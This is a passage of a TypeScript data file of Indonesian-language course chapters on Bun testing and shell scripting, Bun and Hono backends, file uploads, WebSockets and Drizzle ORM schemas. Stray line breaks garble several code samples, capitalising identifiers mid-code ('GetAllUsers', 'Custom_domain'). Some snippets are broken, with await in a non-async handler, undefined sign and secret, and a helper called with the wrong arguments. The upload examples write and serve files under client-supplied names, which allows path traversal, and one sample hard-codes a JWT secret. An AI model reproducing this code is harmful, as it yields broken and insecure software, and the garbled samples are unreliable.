    explanation: "Setelah menguasai runtime Bun, saatnya mengeksplor toolkit lengkapnya untuk workflow development.\\n\\n**bun:test: Testing Built-in**\\nBun punya test runner built-in yang compatible dengan Jest API.\n\nTidak perlu install jest, @types/jest, ts-jest, atau config apa pun.\\n\\nSupport:\\n- describe(), test(), it(), expect() — Jest-style API\\n- beforeEach(), afterEach(), beforeAll(), afterAll()\\n- expect().toBe(), toEqual(), toContain(),\n\nToThrow()\\n- Mocking dengan jest.fn() compatible API\\n- Snapshot testing\\n- Watch mode dengan --watch\\n\\n**Bun.$: Shell Scripting**\\nBun menyediakan syntax shell scripting yang powerful di dalam file TypeScript/JavaScript.\n\nIni menggantikan kebutuhan akan bash script atau tools seperti zx.\\n\\n```typescript\\nconst result = await $`ls -la`.text();\\nawait $`echo 'Hello' > file.txt`;\\nconst files = await $`find .\n\n-name '*.ts'`.lines();\\n```\\n\\nNotice: backtick template literal yang diawali $.\n\nIni menjalankan command shell dan mengembalikan output. Sangat berguna untuk automation, CI scripts, dan dev tools.\\n\\n**bun build: Production Bundle**\\nBun bisa bundle JavaScript/TypeScript untuk production. Keunggulan dibanding webpack/rollup:\\n- Lebih cepat (native bundler)\\n- Tree shaking otomatis\\n- Minification built-in\\n- Source map\\n- Target environment configurable\\n\\nSupport format:\\n- --format=esm (ES Modules)\\n- --format=cjs (CommonJS)\\n- --target=bun (untuk Bun runtime)\\n- --target=node (untuk Node.js compatibility)\\n- --target=browser (untuk browser)\\n\\n**bun run: Menjalankan Scripts**\\nbun run bekerja seperti npm run, tapi lebih cepat. Perbedaan penting:\\n- bun run membaca package.json scripts\\n- Tidak perlu tulis run — bun dev sama dengan bun run dev\\n- Pre/post scripts otomatis (bun prebuild akan dijalankan sebelum bun build)",

    codeExample: { language: "typescript", code: "// bun:test example\nimport { describe, test, expect } from 'bun:test';\nimport { Database } from 'bun:sqlite';\n\ndescribe('User Service', () => {\n  const db = new Database(':memory:');\n  \n  test('should create user', () => {\n    db.exec('CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT)');\n    const result = db.prepare('INSERT INTO users (name) VALUES (?)').run('Budi');\n    expect(result.lastInsertRowid).toBe(1);\n  });\n  \n  test('should query users', () => {\n    const users = db.query('SELECT * FROM users').all();\n    expect(users).toHaveLength(1);\n    expect(users[0].name).toBe('Budi');\n  });\n  \n  test('should handle errors', () => {\n    expect(() => {\n      db.prepare('INSERT INTO users (id) VALUES (?)').run('not-a-number');\n    }).toThrow();\n  });\n});\n\n// Shell scripting\nconst output = await $`echo 'Hello Bun!'`.text();\nconsole.log(output); // Hello Bun!" },

    explainAlong: "bun:test API compatible dengan Jest — migration dari Jest sangat mudah. :memory: database untuk test isolation.",

    aiPrompt: "Tulis test untuk API endpoint Bun.serve() yang sudah kamu buat. Test GET, POST, dan 404 responses.",

    reflection: "Bandingkan waktu eksekusi test antara bun test dan jest di proyek yang sama.",

  },

  {

    id: "17.4",

    moduleId: 17,

    chapterNum: "17.4",

    title: "Bun untuk Backend Development",

    subtitle: "Pattern dan best practices development backend dengan Bun",

    level: "Menengah-Lanjut",

    objectives: [

      "Mengerti pattern backend dengan Bun",

      "Bisa membuat middleware system",

      "Mengerti environment dan deployment Bun",

    ],

    analogy: { diagram: "Backend Pattern:\nRequest → Middleware (auth, logging) → Handler → Response\n\nBun + Hono = Backend modern yang ringan dan cepat", caption: "Bun sebagai fondasi runtime, framework seperti Hono untuk routing dan middleware" },

    explanation: "Bun.serve() yang sudah kita pelajari adalah fondasi yang bagus, tapi untuk aplikasi production, kita butuh lebih dari sekadar routing sederhana.\n\nKita butuh middleware, error handling, validation, dan struktur yang terorganisir.\\n\\n**Pattern Middleware di Bun**\\nMeskipun Bun.serve() tidak punya middleware built-in seperti Express, kita bisa membuat sistem middleware sendiri:\\n\\n```typescript\\ntype Middleware = (req: Request, next: () => Response | Promise<Response>) => Response | Promise<Response>;\\n\\nfunction compose(middlewares: Middleware[],\n\nHandler: (req: Request) => Response) {\\n  return async (req: Request) => {\\n    let index = 0;\\n    const next = async (): Promise<Response> => {\\n      if (index < middlewares.length) {\\n        return middlewares[index++](req, next);\\n      }\\n      return handler(req);\\n    };\\n    return next();\\n  };\\n}\\n```\\n\\nTapi sebenarnya, daripada membuat dari nol, lebih baik menggunakan framework yang sudah teruji seperti Hono.\\n\\n**Bun + Hono: Kombinasi Sempurna**\\nHono adalah framework web ultra-lightweight yang dirancang untuk edge runtime — termasuk Bun.\n\nDengan kombinasi Bun + Hono, kamu mendapatkan:\\n- Bun: runtime cepat dengan built-in tools\\n- Hono: routing, middleware, validation,\n\nDan DX yang bagus\\n\\nIni akan kita pelajari detail di chapter Hono berikutnya.\\n\\n**Environment Variables di Bun**\\nBun membaca .env file secara otomatis — tidak perlu install dotenv:\\n\\n```bash\\n# .env\\nDATABASE_URL=sqlite:app.db\\nJWT_SECRET=super-secret-key\\nPORT=3000\\n```\\n\\nAkses di kode:\\n```typescript\\nconst port = process.env.PORT || 3000;\\n// atau\\nconst port = Bun.env.PORT || 3000;\\n```\\n\\n**Deployment Bun**\\nPilihan deployment untuk Bun:\\n1.\n\n**VPS/Server**: Install Bun di server, jalankan dengan process manager (PM2, systemd)\\n2.\n\n**Docker**: Image resmi oven/bun tersedia\\n3.\n\n**Fly.io**: Support Bun native\\n4.\n\n**Edge platforms**: Cloudflare Workers, Vercel Edge (dengan kompilasi)\\n\\n**Dockerfile untuk Bun:**\\n```dockerfile\\nFROM oven/bun:1 AS base\\nWORKDIR /app\\nCOPY package.json bun.lockb ./\\nRUN bun install --production\\nCOPY . .\\nEXPOSE 3000\\nCMD [\\\"bun\\\", \\\"run\\\",\n\n\\\"src/index.ts\\\"]\\n```\\n\\n**Monitoring dan Logging**\\nUntuk production, tambahkan:\\n- Structured logging (Winston, Pino, atau built-in console)\\n- Health check endpoint\\n- Graceful shutdown handler\\n- Error tracking (Sentry)\\n\\n**Best Practices Bun Backend**\\n1.\n\nGunakan TypeScript untuk type safety\\n2.\n\nValidasi input dengan Zod sebelum memproses\\n3. Gunakan SQLite untuk prototyping, PostgreSQL untuk production\\n4. Implementasikan rate limiting\\n5. Gunakan environment variables untuk konfigurasi\\n6.\n\nTulis test untuk setiap endpoint",

    codeExample: { language: "typescript", code: "// Structured backend dengan Bun\nimport { Database } from 'bun:sqlite';\n\n// Environment\nconst PORT = Number(Bun.env.PORT || 3000);\nconst DB_PATH = Bun.env.DATABASE_URL || 'app.db';\n\n// Database\nconst db = new Database(DB_PATH);\n\n// Middleware logger\nfunction logger(req: Request, next: () => Response) {\n  const start = Date.now();\n  const res = next();\n  console.log(`${req.method} ${req.url} - ${Date.now() - start}ms`);\n  return res;\n}\n\n// Error handler\nfunction errorHandler(handler: (req: Request) => Response) {\n  return (req: Request) => {\n    try {\n      return handler(req);\n    } catch (err) {\n      console.error(err);\n      return Response.json({ error: 'Internal Server Error' }, { status: 500 });\n    }\n  };\n}\n\n// Graceful shutdown\nprocess.on('SIGTERM', () => {\n  console.log('Shutting down gracefully...');\n  db.close();\n  process.exit(0);\n});\n\nBun.serve({\n  port: PORT,\n  fetch: errorHandler((req) => {\n    return logger(req, () => route(req));\n  }),\n});\n\nfunction route(req: Request): Response {\n  const url = new URL(req.url);\n  if (url.pathname === '/health') return Response.json({ status: 'ok' });\n  if (url.pathname === '/api/users') return Response.json(db.query('SELECT * FROM users').all());\n  return new Response('Not Found', { status: 404 });\n}\n\nconsole.log(`Server running on port ${PORT}`);" },

    explainAlong: "Graceful shutdown memastikan database ditutup dengan benar saat server dimatikan. Error handler middleware menangkap uncaught exceptions.",

    aiPrompt: "Implementasikan rate limiting sederhana dengan Map untuk tracking request per IP. Block IP yang melebihi threshold.",

    reflection: "Bun runtime sangat cepat startup-nya. Coba hitung berapa milidetik dari bun run sampai server siap menerima request.",

  },

  {

    id: "17.5",

    moduleId: 17,

    chapterNum: "17.5",

    title: "Hono: Framework Web Ultra-Cepat",

    subtitle: "Routing, middleware, dan DX yang modern untuk backend",

    level: "Menengah",

    objectives: [

      "Memahami filosofi Hono",

      "Bisa membuat routing dan handlers",

      "Mengerti middleware system di Hono",

    ],

    analogy: { diagram: "Express.js vs Hono:\nExpress: app.get('/', (req, res) => res.send('OK'))\nHono: app.get('/', (c) => c.text('OK'))\n\nHono lebih ringan, lebih cepat, dan support TypeScript native.", caption: "Hono = web framework yang dirancang untuk edge runtime — ringan, cepat, dan modern" },

    explanation: "Express.js adalah framework backend Node.js yang paling populer selama satu dekade.\n\nTapi Express punya beberapa kelemahan: tidak support TypeScript dengan baik, middleware pattern yang outdated, dan performa yang bisa lebih baik.\n\nHono datang sebagai alternatif modern.\\n\\n**Apa Itu Hono?**\\nHono (bahasa Jepang untuk 'api/flame') adalah web framework yang ultra-lightweight,\n\nUltra-fast, dan berjalan di berbagai runtime: Node.js, Bun, Deno, Cloudflare Workers, Vercel Edge, dan lainnya.\n\nFilosofinya: cepat, ringan, dan developer-friendly.\\n\\n**Kenapa Hono?**\\n1.\n\n**Multi-runtime**: Kode yang sama berjalan di Node, Bun, dan edge platforms\\n2. **TypeScript native**: Dibuat dengan TypeScript, types sudah built-in\\n3. **Ultra-lightweight**: Hanya ~15KB, zero-dependency\\n4. **Middleware**: Pattern middleware yang modern dan intuitif\\n5.\n\n**Built-in helpers**: JSON, HTML, redirect, cookie, JWT, validation\\n\\n**Perbedaan dengan Express**\\n\\n| Fitur | Express | Hono |\\n|-------|---------|------|\\n| Size | ~60KB | ~15KB |\\n| TypeScript | Manual setup | Native |\\n| Runtime | Node only | Multi-runtime |\\n| Context | req,\n\nRes | c (single object) |\\n| Async | Callback | Promise native |\\n\\n**Context Object: c**\\nDi Hono, semua informasi request dan response ada di satu objek: c (context).\n\nIni lebih bersih daripada Express yang memisahkan req dan res.\\n\\n```typescript\\napp.get('/user/:id', (c) => {\\n  const id = c.req.param('id');     // URL parameter\\n  const name = c.req.query('name');  // Query string\\n  const body = await c.req.json();   // Request body\\n  return c.json({ id,\n\nName });       // Response JSON\\n});\\n```\\n\\n**Installation**\\n```bash\\nnpm install hono\\n# atau\\nbun add hono\\n```",

    codeExample: { language: "typescript", code: "// Basic Hono app\nimport { Hono } from 'hono';\n\nconst app = new Hono();\n\n// Routing\napp.get('/', (c) => c.text('Hello Hono!'));\n\napp.get('/json', (c) => c.json({ message: 'Hello', status: 'ok' }));\n\n// Path parameters\napp.get('/users/:id', (c) => {\n  const id = c.req.param('id');\n  return c.json({ userId: id });\n});\n\n// Query parameters\napp.get('/search', (c) => {\n  const q = c.req.query('q');\n  const page = c.req.query('page') || '1';\n  return c.json({ query: q, page });\n});\n\n// Request body\napp.post('/users', async (c) => {\n  const body = await c.req.json();\n  return c.json({ created: body }, 201);\n});\n\n// HTML response\napp.get('/page', (c) => c.html('<h1>Hello World</h1>'));\n\n// Redirect\napp.get('/old', (c) => c.redirect('/new', 301));\n\n// Bun serve\nexport default {\n  port: 3000,\n  fetch: app.fetch,\n};\n\n// atau untuk Node/Deno/Bun\n// Bun.serve({ fetch: app.fetch });" },

    explainAlong: "Hono app.fetch adalah handler yang compatible dengan web standard fetch API — bisa dipakai di Bun, Deno, Cloudflare Workers, dan Vercel Edge.",

    aiPrompt: "Install Hono dan buat REST API untuk resource 'books' dengan endpoint: GET /books, GET /books/:id, POST /books, PUT /books/:id, DELETE /books/:id.",

    reflection: "Bandingkan boilerplate code antara Express dan Hono untuk endpoint yang sama. Mana yang lebih bersih?",

  },

  {

    id: "17.6",

    moduleId: 17,

    chapterNum: "17.6",

    title: "Hono: Middleware dan Validasi",

    subtitle: "Tingkatkan aplikasi dengan middleware chain dan input validation",

    level: "Menengah",

    objectives: [

      "Bisa membuat dan menggunakan middleware",

      "Mengerti middleware chain dan next()",

      "Mengintegrasikan Zod untuk validasi",

    ],

    analogy: { diagram: "Middleware Chain:\nRequest → Logger → Auth → Validator → Handler → Response\n\nSetiap middleware bisa:\n- Modify request/response\n- Stop chain (tidak panggil next)\n- Execute code before dan after handler", caption: "Middleware pattern di Hono memungkinkan reusable logic untuk cross-cutting concerns" },

    explanation: "Middleware adalah kunci untuk membangun backend yang terstruktur. Bayangkan middleware sebagai 'lapisan keamanan' di bandara: setiap penumpang melewati beberapa checkpoint sebelum sampai ke gate. Setiap checkpoint bisa mengizinkan, memodifikasi, atau menolak.\\n\\n**Middleware di Hono**\\nDi Hono, middleware adalah fungsi yang menerima context dan next function. Middleware bisa berjalan sebelum handler (panggil next()), setelah handler (kode setelah next()), atau menggantikan handler sama sekali (tidak panggil next()).\\n\\n```typescript\\napp.use('*', async (c, next) => {\\n  console.log('Before handler');  // Sebelum handler\\n  await next();                  // Lanjut ke handler berikutnya\\n  console.log('After handler');   // Setelah handler selesai\\n});\\n```\\n\\n**Built-in Middleware Hono**\\nHono menyediakan banyak middleware bawaan:\\n- **logger**: Request logging ke console\\n- **cors**: Cross-origin resource sharing\\n- **csrf**: CSRF protection\\n- **etag**: HTTP ETag untuk caching\\n- **pretty-json**: Format JSON yang readable\\n- **serveStatic**: Serve static files\\n- **jwt**: JWT authentication\\n- **zod-validator**: Integrasi Zod validation\\n\\n**Validator Middleware dengan Zod**\\nHono punya integrasi Zod yang seamless untuk validasi input:\\n\\n```typescript\\nimport { zValidator } from '@hono/zod-validator';\\nimport { z } from 'zod';\\n\\nconst userSchema = z.object({\\n  name: z.string().min(1),\\n  email: z.string().email(),\\n  age: z.number().min(0).max(150),\\n});\\n\\napp.post('/users', zValidator('json', userSchema), (c) => {\\n  const data = c.req.valid('json'); // Sudah tervalidasi, typed!\\n  // ... simpan ke database\\n  return c.json({ success: true }, 201);\\n});\\n```\\n\\nNotice: Setelah validasi, data sudah ter-typing sesuai schema Zod.\n\nTypeScript akan tahu tipe data yang valid.\\n\\n**Auth Middleware**\\nContoh middleware autentikasi dengan JWT:\\n\\n```typescript\\napp.use('/api/*', async (c, next) => {\\n  const token = c.req.header('Authorization')?.replace('Bearer ', '');\\n  if (!token) return c.json({ error: 'Unauthorized' },\n\n401);\\n  \\n  try {\\n    const payload = await verify(token, secret);\\n    c.set('user', payload); // Attach ke context\\n    await next();\\n  } catch {\\n    return c.json({ error: 'Invalid token' }, 403);\\n  }\\n});\\n```\\n\\nMiddleware ini berjalan untuk SEMUA route yang dimulai dengan /api/.\n\nKita menggunakan c.set() untuk menyimpan data user ke context, sehingga handler bisa mengaksesnya dengan c.get('user').",

    codeExample: { language: "typescript", code: "import { Hono } from 'hono';\nimport { logger } from 'hono/logger';\nimport { cors } from 'hono/cors';\nimport { zValidator } from '@hono/zod-validator';\nimport { z } from 'zod';\nimport { jwt } from 'hono/jwt';\n\nconst app = new Hono();\n\n// Global middleware\napp.use(logger());\napp.use(cors({ origin: 'http://localhost:5173' }));\n\n// Validation schemas\nconst createUserSchema = z.object({\n  name: z.string().min(2, 'Nama minimal 2 karakter'),\n  email: z.string().email('Email tidak valid'),\n  role: z.enum(['user', 'admin']).default('user'),\n});\n\n// Public routes\napp.get('/health', (c) => c.json({ status: 'ok', timestamp: new Date().toISOString() }));\n\napp.post('/login', async (c) => {\n  const { email, password } = await c.req.json();\n  // ... verify credentials\n  const token = await sign({ email }, secret);\n  return c.json({ token });\n});\n\n// Protected routes\napp.use('/api/*', jwt({ secret: 'my-secret' }));\n\napp.get('/api/users', (c) => {\n  const user = c.get('jwtPayload');\n  return c.json({ users: [], requestedBy: user.email });\n});\n\napp.post('/api/users',\n  zValidator('json', createUserSchema),\n  (c) => {\n    const data = c.req.valid('json'); // Typed sebagai z.infer<typeof createUserSchema>\n    console.log('Creating user:', data);\n    return c.json({ id: '123', ...data }, 201);\n  }\n);\n\n// Error handling\napp.onError((err, c) => {\n  console.error(err);\n  return c.json({ error: 'Internal Server Error' }, 500);\n});\n\nexport default app;" },

    explainAlong: "Middleware dideklarasikan dengan app.use(). Urutan penting — middleware dieksekusi sesuai urutan deklarasi. zValidator otomatis return 400 dengan error detail kalau validasi gagal.",

    aiPrompt: "Buat middleware rate limiting menggunakan memory store (Map). Limit 100 request per 15 menit per IP.",

    reflection: "Coba buat middleware kompresi response. Gunakan CompressionStream API untuk gzip response body.",

  },

  {

    id: "17.7",

    moduleId: 17,

    chapterNum: "17.7",

    title: "Hono: Router, Grouping, dan Error Handling",

    subtitle: "Struktur aplikasi backend yang terorganisir dan scalable",

    level: "Menengah",

    objectives: [

      "Bisa menggunakan Hono router",

      "Mengerti route grouping dan modularisasi",

      "Menguasai error handling dan custom responses",

    ],

    analogy: { diagram: "App Structure:\nsrc/\n├── index.ts      # Entry point + middleware global\n├── routes/\n│   ├── users.ts  # User routes\n│   └── posts.ts  # Post routes\n├── middleware/\n│   ├── auth.ts   # Auth middleware\n│   └── validate.ts\n└── types.ts      # Shared types", caption: "Modularisasi route membuat aplikasi mudah dikelola saat bertumbuh" },

    explanation: "Seiring aplikasi bertumbuh, meletakkan semua route di satu file menjadi tidak praktis.\n\nHono menyediakan mekanisme untuk memecah aplikasi menjadi modul-modul yang terorganisir.\\n\\n**Hono Router**\\nHono punya sistem router yang powerful.\n\nSelain route biasa, Hono support:\\n- **Path parameters**: /users/:id\\n- **Wildcard**: /users/*\\n- **Regexp**: /version/(\\\\d+)\\n- **Multiple methods**: app.on('PURGE', '/cache', handler)\\n- **Priority**: Static routes dicek dulu, baru parameterized\\n\\n**Route Grouping**\\nKamu bisa membuat sub-router dan mount ke app utama:\\n\\n```typescript\\nconst userRoutes = new Hono();\\nuserRoutes.get('/',\n\nGetAllUsers);\\nuserRoutes.get('/:id', getUser);\\nuserRoutes.post('/', createUser);\\n\\napp.route('/users', userRoutes);\\n// Hasil: GET /users, GET /users/:id, POST /users\\n```\\n\\n**Base Path**\\nAlternatif lain: gunakan basePath saat membuat Hono instance:\\n\\n```typescript\\nconst app = new Hono().basePath('/api');\\n// Sekarang semua route diawali /api\\n```\\n\\n**Error Handling**\\nHono punya beberapa cara handle error:\\n\\n1.\n\n**app.onError()**: Global error handler untuk semua route\\n2.\n\n**try-catch di handler**: Handle error per-route\\n3.\n\n**HTTPException**: Throw error dengan status code spesifik\\n\\n```typescript\\nimport { HTTPException } from 'hono/http-exception';\\n\\napp.get('/users/:id', (c) => {\\n  const id = c.req.param('id');\\n  const user = db.findUser(id);\\n  if (!user) {\\n    throw new HTTPException(404, { message: 'User not found' });\\n  }\\n  return c.json(user);\\n});\\n\\napp.onError((err, c) => {\\n  if (err instanceof HTTPException) {\\n    return c.json({ error: err.message }, err.status);\\n  }\\n  return c.json({ error: 'Internal error' },\n\n500);\\n});\\n```\\n\\n**Custom Response Helpers**\\nBuat helper untuk response konsisten:\\n\\n```typescript\\n// utils/response.ts\\nexport function success<T>(c: Context, data: T, status = 200) {\\n  return c.json({ success: true, data }, status);\\n}\\n\\nexport function error(c: Context, message: string, status = 400) {\\n  return c.json({ success: false, error: message }, status);\\n}\\n\\n// Penggunaan\\napp.get('/users', (c) => {\\n  return success(c, users);\\n});\\n```",

    codeExample: { language: "typescript", code: "// Modular Hono app\nimport { Hono } from 'hono';\nimport { logger } from 'hono/logger';\nimport { HTTPException } from 'hono/http-exception';\n\n// Types\ninterface User {\n  id: string;\n  name: string;\n  email: string;\n}\n\n// Mock database\nconst users: User[] = [\n  { id: '1', name: 'Budi', email: 'budi@mail.com' },\n  { id: '2', name: 'Ani', email: 'ani@mail.com' },\n];\n\n// Response helpers\nconst jsonOk = (c: any, data: any) => c.json({ success: true, data });\nconst jsonErr = (c: any, message: string, status = 400) =>\n  c.json({ success: false, error: message }, status);\n\n// User routes\nconst usersRoute = new Hono();\n\nusersRoute.get('/', (c) => jsonOk(c, users));\n\nusersRoute.get('/:id', (c) => {\n  const id = c.req.param('id');\n  const user = users.find(u => u.id === id);\n  if (!user) throw new HTTPException(404, { message: 'User not found' });\n  return jsonOk(c, user);\n});\n\nusersRoute.post('/', async (c) => {\n  const body = await c.req.json<User>();\n  const newUser = { id: String(users.length + 1), ...body };\n  users.push(newUser);\n  return jsonOk(c, newUser, 201);\n});\n\nusersRoute.put('/:id', async (c) => {\n  const id = c.req.param('id');\n  const body = await c.req.json<Partial<User>>();\n  const idx = users.findIndex(u => u.id === id);\n  if (idx === -1) throw new HTTPException(404, { message: 'User not found' });\n  users[idx] = { ...users[idx], ...body };\n  return jsonOk(c, users[idx]);\n});\n\nusersRoute.delete('/:id', (c) => {\n  const id = c.req.param('id');\n  const idx = users.findIndex(u => u.id === id);\n  if (idx === -1) throw new HTTPException(404, { message: 'User not found' });\n  users.splice(idx, 1);\n  return c.body(null, 204);\n});\n\n// Main app\nconst app = new Hono();\napp.use(logger());\napp.route('/api/users', usersRoute);\n\napp.onError((err, c) => {\n  if (err instanceof HTTPException) {\n    return jsonErr(c, err.message, err.status);\n  }\n  console.error(err);\n  return jsonErr(c, 'Internal Server Error', 500);\n});\n\nexport default app;" },

    explainAlong: "Route grouping dengan app.route() memisahkan concern. HTTPException untuk error dengan status code. Response helpers untuk konsistensi API response.",

    aiPrompt: "Pecah aplikasimu menjadi beberapa route module: users.ts, posts.ts, comments.ts. Tambahkan auth middleware untuk routes yang protected.",

    reflection: "Refactor aplikasimu menggunakan pattern MVC atau layered architecture. Pisahkan controller logic dari route definitions.",

  },

  {

    id: "17.8",

    moduleId: 17,

    chapterNum: "17.8",

    title: "Hono: File Upload, WebSocket, dan Deployment",

    subtitle: "Fitur lanjut untuk aplikasi production-ready",

    level: "Menengah-Lanjut",

    objectives: [

      "Bisa handle file upload di Hono",

      "Mengerti WebSocket dengan Hono",

      "Bisa deploy Hono ke berbagai platform",

    ],

    analogy: { diagram: "Hono Features:\n├── File upload (multipart/form-data)\n├── WebSocket (real-time)\n├── Streaming response\n├── JSX response (SSR)\n└── Edge runtime support", caption: "Hono support fitur modern yang dibutuhkan aplikasi production" },

    explanation: "Setelah menguasai routing, middleware, dan validasi, saatnya mengeksplor fitur lanjut Hono yang sering dibutuhkan di aplikasi nyata.\\n\\n**File Upload**\\nHono bisa menangani file upload melalui multipart/form-data.\n\nData form bisa diakses melalui c.req.parseBody().\\n\\n```typescript\\napp.post('/upload', async (c) => {\\n  const body = await c.req.parseBody();\\n  const file = body.file as File; // File object (web standard)\\n  \\n  // Simpan file\\n  await Bun.write(`./uploads/${file.name}`,\n\nFile);\\n  \\n  return c.json({\\n    filename: file.name,\\n    size: file.size,\\n    type: file.type,\\n  });\\n});\\n```\\n\\n**WebSocket dengan Hono**\\nHono support WebSocket melalui adapter.\n\nDi Bun:\\n\\n```typescript\\nimport { createBunWebSocket } from 'hono/bun';\\n\\nconst { upgradeWebSocket, websocket } = createBunWebSocket();\\n\\napp.get('/ws', upgradeWebSocket((c) => ({\\n  onOpen(ws) {\\n    ws.send('Connected!');\\n  },\\n  onMessage(ws, message) {\\n    ws.send(`Echo: ${message}`);\\n  },\\n  onClose() {\\n    console.log('Client disconnected');\\n  },\\n})));\\n\\nBun.serve({\\n  fetch: app.fetch,\\n  websocket,\\n});\\n```\\n\\n**Streaming Response**\\nHono support streaming untuk response besar atau real-time data:\\n\\n```typescript\\napp.get('/stream',\n\n(c) => {\\n  return new Response(\\n    new ReadableStream({\\n      async start(controller) {\\n        for (let i = 0; i < 10; i++) {\\n          controller.enqueue(`data: ${i}\\\\n\\\\n`);\\n          await new Promise(r => setTimeout(r, 1000));\\n        }\\n        controller.close();\\n      },\\n    }),\\n    { headers: { 'Content-Type': 'text/event-stream' } }\\n  );\\n});\\n```\\n\\n**Deployment Options**\\nHono bisa di-deploy ke banyak platform:\\n\\n1.\n\n**Bun runtime**: Bun.serve({ fetch: app.fetch })\\n2.\n\n**Node.js**: export default app (untuk serverless)\\n3.\n\n**Cloudflare Workers**: export default app (native support)\\n4.\n\n**Vercel Edge**: export default app (edge runtime)\\n5.\n\n**Deno**: Deno.serve(app.fetch)\\n\\n**Cloudflare Workers Example**\\n```typescript\\n// wrangler.toml\\n// [env.production]\\n// routes = [{ pattern = \\\"api.example.com/*\\\",\n\nCustom_domain = true }]\\n\\nimport { Hono } from 'hono';\\nconst app = new Hono();\\napp.get('/', (c) => c.text('Hello from the Edge!'));\\nexport default app; // That's it!\\n```\\n\\nNotice: Tidak perlu listen pada port!\n\nCloudflare Workers menggunakan fetch handler directly.",

    codeExample: { language: "typescript", code: "// File upload + Bun integration\nimport { Hono } from 'hono';\n\nconst app = new Hono();\n\n// Single file upload\napp.post('/upload', async (c) => {\n  const body = await c.req.parseBody();\n  const file = body.file as File;\n  \n  if (!file) return c.json({ error: 'No file' }, 400);\n  \n  // Validate file type\n  const allowedTypes = ['image/jpeg', 'image/png', 'image/webp'];\n  if (!allowedTypes.includes(file.type)) {\n    return c.json({ error: 'Invalid file type' }, 400);\n  }\n  \n  // Validate file size (max 5MB)\n  if (file.size > 5 * 1024 * 1024) {\n    return c.json({ error: 'File too large (max 5MB)' }, 400);\n  }\n  \n  // Generate unique filename\n  const ext = file.name.split('.').pop();\n  const filename = `${Date.now()}-${Math.random().toString(36).slice(2)}.${ext}`;\n  \n  // Save with Bun\n  await Bun.write(`./uploads/${filename}`, file);\n  \n  return c.json({\n    filename,\n    originalName: file.name,\n    size: file.size,\n    url: `/uploads/${filename}`,\n  }, 201);\n});\n\n// Serve uploaded files\napp.get('/uploads/:filename', async (c) => {\n  const filename = c.req.param('filename');\n  const file = Bun.file(`./uploads/${filename}`);\n  if (!(await file.exists())) {\n    return c.json({ error: 'File not found' }, 404);\n  }\n  return new Response(file);\n});\n\nexport default app;" },

    explainAlong: "File object adalah web standard API. Bun.write() menyimpan file dengan efisien. Validasi type dan size sebelum menyimpan.",

    aiPrompt: "Tambahkan resize gambar menggunakan library sharp setelah upload. Simpan versi thumbnail dan original.",

    reflection: "Deploy Hono app-mu ke Cloudflare Workers atau platform edge lainnya. Rasakan performa edge computing!",

  },

  {

    id: "17.9",

    moduleId: 17,

    chapterNum: "17.9",

    title: "Drizzle ORM: Type-Safe SQL di TypeScript",

    subtitle: "ORM modern dengan pendekatan SQL-first dan type safety penuh",

    level: "Menengah",

    objectives: [

      "Memahami filosofi Drizzle ORM",

      "Bisa setup Drizzle dan define schema",

      "Mengerti type-safe queries",

    ],

    analogy: { diagram: "ORM Comparison:\nPrisma: Schema → Generate Client → Query\nDrizzle: Schema → TypeScript → SQL-like Query\n\nDrizzle lebih dekat ke SQL, zero overhead runtime.", caption: "Drizzle ORM = SQL yang type-safe, bukan abstraction yang menyembunyikan SQL" },

    explanation: "ORM (Object-Relational Mapping) adalah cara kita berinteraksi dengan database menggunakan objek dan method, bukan menulis SQL mentah. Ada banyak ORM di ekosistem JavaScript: Sequelize, TypeORM, Prisma, MikroORM, dan sekarang Drizzle.\\n\\n**Kenapa Drizzle?**\\nDrizzle adalah ORM terbaru yang mendapat banyak perhatian karena pendekatannya yang unik:\\n\\n1. **SQL-like syntax**: Query Drizzle terlihat seperti SQL biasa — tidak ada DSL yang perlu dipelajari\\n2. **Type-safe**: Hasil query ter-typing otomatis berdasarkan schema\\n3.\n\n**Zero overhead**: Drizzle adalah thin layer di atas SQL — tidak ada magic\\n4.\n\n**Multi-database**: Support PostgreSQL, MySQL, SQLite, dan lebih banyak lagi\\n5.\n\n**Migrations**: Drizzle Kit untuk schema migrations\\n6.\n\n**Relasi**: Define relasi antar tabel dengan TypeScript\\n\\n**Drizzle vs Prisma**\\n\\n| Aspek | Drizzle | Prisma |\\n|-------|---------|--------|\\n| Syntax | SQL-like | Fluent API |\\n| Type safety | Native | Generated client |\\n| Bundle size | ~7KB | ~15MB (dev) |\\n| Migrations | SQL files | Prisma Migrate |\\n| Raw SQL | Mudah | Perlu $queryRaw |\\n| Learning curve | Rendah (kalau tahu SQL) | Sedang |\\n\\n**Setup Drizzle**\\n```bash\\n# Install\\nnpm install drizzle-orm pg  # untuk PostgreSQL\\nnpm install -D drizzle-kit\\n\\n# atau dengan Bun\\nbun add drizzle-orm bun:sqlite\\nbun add -d drizzle-kit\\n```\\n\\n**Define Schema**\\nSchema di Drizzle didefinisikan sebagai kode TypeScript biasa:\\n\\n```typescript\\nimport { sqliteTable,\n\nText, integer } from 'drizzle-orm/sqlite-core';\\n\\nexport const users = sqliteTable('users', {\\n  id: integer('id').primaryKey({ autoIncrement: true }),\\n  name: text('name').notNull(),\\n  email: text('email').notNull().unique(),\\n  createdAt: integer('created_at', { mode: 'timestamp' }).$defaultFn(() => new Date()),\\n});\\n```\\n\\nNotice: Ini adalah kode TypeScript murni — tidak perlu schema file terpisah atau code generation.",

    codeExample: { language: "typescript", code: "// Schema definition\nimport { sqliteTable, text, integer, real } from 'drizzle-orm/sqlite-core';\n\n// Users table\nexport const users = sqliteTable('users', {\n  id: integer('id', { mode: 'number' }).primaryKey({ autoIncrement: true }),\n  name: text('name').notNull(),\n  email: text('email').notNull().unique(),\n  role: text('role', { enum: ['user', 'admin'] }).notNull().default('user'),\n  createdAt: integer('created_at', { mode: 'timestamp' }).$defaultFn(() => new Date()),\n});\n\n// Products table\nexport const products = sqliteTable('products', {\n  id: integer('id', { mode: 'number' }).primaryKey({ autoIncrement: true }),\n  name: text('name').notNull(),\n  description: text('description'),\n  price: real('price').notNull(),\n  stock: integer('stock').notNull().default(0),\n  category: text('category'),\n  userId: integer('user_id').references(() => users.id),\n});\n\n// Types inference\nexport type User = typeof users.$inferSelect;\nexport type NewUser = typeof users.$inferInsert;\nexport type Product = typeof products.$inferSelect;" },

    explainAlong: "Drizzle schema adalah TypeScript code biasa — tidak perlu code generation. $inferSelect dan $inferInsert menghasilkan TypeScript types otomatis.",

    aiPrompt: "Buat schema untuk blog: posts, categories, comments, dan tags dengan relasi many-to-many.",

    reflection: "Bandingkan schema Drizzle-mu dengan equivalent Prisma schema. Mana yang lebih intuitif menurutmu?",

  },

  {

    id: "17.10",

